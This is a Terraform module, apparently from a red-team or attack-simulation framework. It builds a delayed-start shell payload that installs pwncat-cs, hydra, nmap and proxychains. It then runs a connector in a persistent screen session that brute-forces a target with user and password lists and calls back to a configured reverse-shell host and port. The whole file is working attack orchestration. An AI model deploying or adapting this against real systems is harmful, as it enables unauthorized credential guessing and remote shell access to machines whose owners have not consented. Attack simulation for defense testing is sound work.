locals {
    attack_dir = "/pwncat_connector"
    payload = <<-EOT
    PWNCAT_LOG="/tmp/pwncat_connector.log"
    PWNCAT_SESSION="pwncat_connector"
    PWNCAT_SESSION_LOCK="pwncat_connector_session.lock"
    if [ -e "/tmp/$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; then
        log "Pwncat session lock /tmp/$PWNCAT_SESSION_LOCK exists and $PWNCAT_SESSION screen session running. Skipping setup."
    else
        rm -f "/tmp/$PWNCAT_SESSION_LOCK"
        log "Session lock doesn't exist and screen session not runing. Continuing..."
        screen -S $PWNCAT_SESSION -X quit
        screen -wipe
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
        cd ${local.attack_dir}
        echo ${local.connector} | base64 -d > connector.py
        echo ${local.scan} | base64 -d > scan.sh
        log "installing required python3.9..."
        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
        python3.9 get-pip.py >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        log "checking for user and password list before starting..."
        while ! [ -f "${var.inputs["user_list"]}" ] || ! [ -f "${var.inputs["password_list"]}" ]; do
            log "waiting for ${var.inputs["user_list"]} and ${var.inputs["password_list"]}..."
            sleep 30
        done
        START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        while true; do
            for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
            mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
            log "starting background process via screen..."
            screen -S $PWNCAT_SESSION -X quit
            screen -wipe
            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m python3.9 connector.py --target-ip=\"${var.inputs["target_ip"]}\" --target-port=\"${var.inputs["target_port"]}\" --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\" --payload=\"${base64encode(var.inputs["payload"])}\" --reverse-shell-host=\"${var.inputs["remote_shell_host"]}\"  --reverse-shell-port=\"${var.inputs["remote_shell_port"]}\"" >/dev/null 2>&1 &
            screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
            log "connector started."
            log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
            sleep 1800
            log "sleep complete - checking for running sessions..."
            while [ -e "/tmp/$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; do
                log "pwncat session still running - waiting before restart..."
                sleep 600
            done
            log "no pwncat sessions found - continuing..."
            CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
            if [ "$CHECK_HASH" != "$START_HASH" ]; then
                log "payload update detected - exiting loop"
                break
            else
                log "restarting loop..."
            fi
        done
    fi
    log "done."
    EOT

    connector        = base64encode(file(
                                "${path.module}/resources/connector.py", 
                            ))
    
    scan            = base64encode(file(
                                "${path.module}/resources/scan.sh", 
                            ))
    
    base64_payload = templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = "proxychains4 nmap hydra python3-pip"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
            yum update -y
            yum install -y git
            yum groupinstall -y 'Development Tools'
            # proxychains4
            cd /usr/local/src
            git clone https://github.com/rofl0r/proxychains-ng
            cd proxychains-ng
            ./configure && make && make install
            make install-config
            # hydra
            cd /usr/local/src
            git clone https://github.com/vanhauser-thc/thc-hydra
            cd thc-hydra
            ./configure && make && make install
        fi
        EOT
        yum_packages = "nmap python3-pip"
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = [
            {
                name = "${basename(abspath(path.module))}_scan.sh"
                content = local.scan
            },
        ]
    }
}